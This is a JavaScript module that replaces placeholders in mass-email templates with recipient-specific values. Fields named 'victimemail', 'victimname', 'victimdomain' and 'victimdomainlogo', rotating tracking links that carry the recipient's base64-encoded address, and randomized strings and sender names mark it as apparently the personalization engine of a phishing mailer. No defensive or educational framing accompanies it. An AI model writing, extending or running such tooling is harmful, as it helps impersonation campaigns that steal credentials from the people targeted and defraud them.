const fs = require('fs');
const { Buffer } = require('buffer');

// Arrays to store data loaded from files
let firstNames = [];
let lastNames = [];
let companyNames = [];
let linksArray = [];
let wordsArray = [];
let words1Array = [];

// Initialize index variables
let linkIndex = 0;
let wordIndex = 0;

// Function to load data from a text file into an array
function loadFromFile(fileName) {
    try {
        const data = fs.readFileSync(fileName, 'utf8');
        return data.split('\n'); // Split by newline characters to preserve placeholders
    } catch (error) {
        console.error(`Error reading ${fileName}:`, error);
        return [];
    }
}

// Load data from text files into arrays when the module is required
function loadData() {
    firstNames = loadFromFile('fnames.txt').map(item => item.trim()).filter(item => item !== '');
    lastNames = loadFromFile('lnames.txt').map(item => item.trim()).filter(item => item !== '');
    companyNames = loadFromFile('companyNames.txt').map(item => item.trim()).filter(item => item !== '');
    linksArray = loadFromFile('links.txt').map(item => item.trim()); // Preserve placeholders in links
    wordsArray = loadFromFile('words.txt').map(item => item.trim()); // Preserve placeholders in words
    words1Array = loadFromFile('words1.txt').map(item => item.trim()); // Preserve placeholders in words1
}

// Load data from text files when the module is required
loadData();

// Generate a random number of specified length
function generateRandomNumber(count) {
    return Math.floor(Math.random() * Math.pow(10, count)).toString().padStart(count, '0');
}

// Generate a random string of specified length and type (lowercase or uppercase)
function generateRandomString(count, type) {
    const chars = (type === 'lower') ? 'abcdefghijklmnopqrstuvwxyz' : 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
    let randomString = '';
    for (let i = 0; i < count; i++) {
        const randomIndex = Math.floor(Math.random() * chars.length);
        randomString += chars.charAt(randomIndex);
    }
    return randomString;
}

// Replace placeholders in content with actual values based on recipient's information
function replacePlaceholders(content, recipient) {
    if (typeof recipient !== 'string') {
        recipient = recipient.toString(); // Ensure recipient is a string
    }

    const domain = recipient.split('@')[1];
    const name = recipient.split('@')[0];
    const domainParts = domain.split('.');

    const placeholders = {
        '##date1##': new Date().toLocaleString('en-US', { timeZone: 'UTC' }),
        '##date##': new Date().toISOString(),
        '##date2##': new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' }),
        '##time##': getFormattedTime(true),
        '##time1##': getFormattedTime(false),
        '##time2##': getFormattedTime(true, 'GMT'),
        '##randomfname##': getRandomItemFromArray(firstNames),
        '##randomlname##': getRandomItemFromArray(lastNames),
        '##randomcompany##': getRandomItemFromArray(companyNames),
        '##victimb64email##': Buffer.from(recipient).toString('base64'),
        '##words##': getNextWord(wordsArray),
        '##words1##': getNextWord(words1Array),
        '##victimemail##': recipient,
        '##victimname##': name.charAt(0).toUpperCase() + name.slice(1),
        '##victimdomain##': domain,
        '##victimdomain1##': domainParts[0].charAt(0).toUpperCase() + domainParts[0].slice(1),
        '##victimdomain2##': domainParts[0].toUpperCase(),
        '##victimdomain3##': `${domainParts[0].charAt(0).toUpperCase()}${domainParts[0].slice(1)}.${domainParts[1].toUpperCase()}`,
        '##victimdomain4##': domainParts[0].toLowerCase(),
        '##victimdomainlogo##': getDomainLogo(domain),
        '##link##': getNextLink(recipient)
    };

    // Add placeholders for numbers and strings
    for (let i = 1; i <= 10; i++) {
        placeholders[`##num${i}##`] = generateRandomNumber(i);
        placeholders[`##stringlower${i}##`] = generateRandomString(i, 'lower');
        placeholders[`##stringupper${i}##`] = generateRandomString(i, 'upper');
    }

    // Replace placeholders in the content
    for (const key in placeholders) {
        if (placeholders.hasOwnProperty(key)) {
            const regex = new RegExp(key, 'g');
            content = content.replace(regex, placeholders[key]);
        }
    }

    return content;
}

// Function to get a formatted time string
function getFormattedTime(includeSeconds, timeZone) {
    const options = { hour: '2-digit', minute: '2-digit' };
    if (includeSeconds) options.second = '2-digit';
    return new Date().toLocaleTimeString('en-US', { ...options, timeZone: timeZone || undefined });
}

// Function to get a random item from an array
function getRandomItemFromArray(array) {
    return array[Math.floor(Math.random() * array.length)];
}

// Function to get the next word from an array in a circular manner
function getNextWord(array) {
    const word = array[wordIndex];
    wordIndex = (wordIndex + 1) % array.length; // Move to the next word, wrap around if needed
    return word;
}

// Function to get a domain logo representation (example implementation)
function getDomainLogo(domain) {
    if (domain && domain.includes('microsoft.com')) {
        return 'Microsoft Logo';
    }
    // Add more custom logo mappings for other domains
    return 'Custom Logo'; // Default fallback
}

// Function to get the next link and replace placeholders in the link template
function getNextLink(recipient) {
    if (linksArray.length === 0) {
        console.error('No links found in the linksArray.');
        return '';
    }

    const linkTemplate = linksArray[linkIndex];
    let link = linkTemplate
        .replace('##victimb64email##', Buffer.from(recipient).toString('base64'))
        .replace('##victimemail##', recipient);

    linkIndex = (linkIndex + 1) % linksArray.length; // Move to the next link, wrap around if needed
    return link;
}

module.exports = {
    replacePlaceholders
};

